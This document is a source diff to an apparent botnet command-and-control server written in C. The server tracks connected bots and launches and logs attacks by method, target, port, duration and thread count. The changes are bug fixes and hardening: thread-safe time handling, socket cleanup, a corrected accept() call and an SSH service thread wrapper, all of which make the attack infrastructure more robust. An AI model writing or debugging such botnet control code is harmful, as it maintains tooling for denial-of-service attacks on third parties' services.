@@ -64,16 +64,27 @@ void stop_attack_command(int attack_id);
 void stop_all_attacks();
 void save_attack_log(const char* method, const char* target, int port, int duration, int threads);
 void load_attack_history();
+void* cnc_bot_listener(void* arg);
+void command_interface();
+void print_welcome_message();
+void print_help();
+void print_methods();
 
 void signal_handler(int sig) {
+    (void)sig; // Mark parameter as used to avoid warning
     printf("\n\033[1;33m[*] Shutting down C&C server...\033[0m\n");
     cnc_running = 0;
 }
 
 void print_cnc_status() {
+    time_t now = time(NULL);
+    char time_str[26];
+    ctime_r(&now, time_str);
+    time_str[24] = '\0'; // Remove newline
+    
     printf("\033[1;36m");
     printf("┌────────────────────── C&C SERVER STATUS ──────────────────────┐\n");
-    printf("│ Running Time:    %-40s │\n", ctime(&(time_t){time(NULL)}));
+    printf("│ Running Time:    %-40s │\n", time_str);
     printf("│ Connected Bots:  %-40d │\n", bot_count);
     printf("│ Active Attacks:  %-40d │\n", attack_count);
     printf("│ C&C Port:        %-40d │\n", CNC_PORT);
@@ -292,8 +303,12 @@ void save_attack_log(const char* method, const char* target, int port, int durat
     FILE* log_file = fopen("attack_log.txt", "a");
     if (log_file) {
         time_t now = time(NULL);
+        char time_str[26];
+        ctime_r(&now, time_str);
+        time_str[24] = '\0'; // Remove newline
+        
         fprintf(log_file, "[%s] %s %s:%d %ds %d threads\n", 
-                ctime(&now), method, target, port, duration, threads);
+                time_str, method, target, port, duration, threads);
         fclose(log_file);
     }
 }
@@ -307,6 +322,7 @@ void load_attack_history() {
 }
 
 void* attack_monitor_thread(void* arg) {
+    (void)arg; // Mark parameter as used
     while (cnc_running) {
         pthread_mutex_lock(&attack_mutex);
         
@@ -361,11 +377,13 @@ void* handle_bot_connection(void* socket_ptr) {
     }
     
     remove_bot(socket_fd);
+    free(socket_ptr);
     return NULL;
 }
 
 void* cnc_bot_listener(void* arg) {
-    int server_fd, new_socket;
+    (void)arg; // Mark parameter as used
+    int server_fd;
     struct sockaddr_in address;
     int opt = 1;
     
@@ -378,6 +396,7 @@ void* cnc_bot_listener(void* arg) {
     // Set socket options
     if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
         perror("Setsockopt failed");
+        close(server_fd);
         return NULL;
     }
     
@@ -388,19 +407,24 @@ void* cnc_bot_listener(void* arg) {
     // Bind socket
     if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
         perror("Bind failed");
+        close(server_fd);
         return NULL;
     }
     
     // Listen for connections
     if (listen(server_fd, 10) < 0) {
         perror("Listen failed");
+        close(server_fd);
         return NULL;
     }
     
     printf("\033[1;32m[+] C&C Bot listener started on port %d\033[0m\n", CNC_PORT);
     
     while (cnc_running) {
-        int client_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&address);
+        struct sockaddr_in client_addr;
+        socklen_t client_len = sizeof(client_addr);
+        
+        int client_socket = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
         if (client_socket < 0) {
             if (cnc_running) {
                 perror("Accept failed");
@@ -421,9 +445,16 @@ void* cnc_bot_listener(void* arg) {
     return NULL;
 }
 
+// Wrapper function for SSH service thread
+void* ssh_service_wrapper(void* arg) {
+    (void)arg;
+    start_ssh_service();
+    return NULL;
+}
+
 void start_ssh_in_thread() {
     pthread_t ssh_thread;
-    pthread_create(&ssh_thread, NULL, (void*)start_ssh_service, NULL);
+    pthread_create(&ssh_thread, NULL, ssh_service_wrapper, NULL);
     printf("\033[1;32m[+] SSH service starting on port %d...\033[0m\n", SSH_PORT);
 }
 
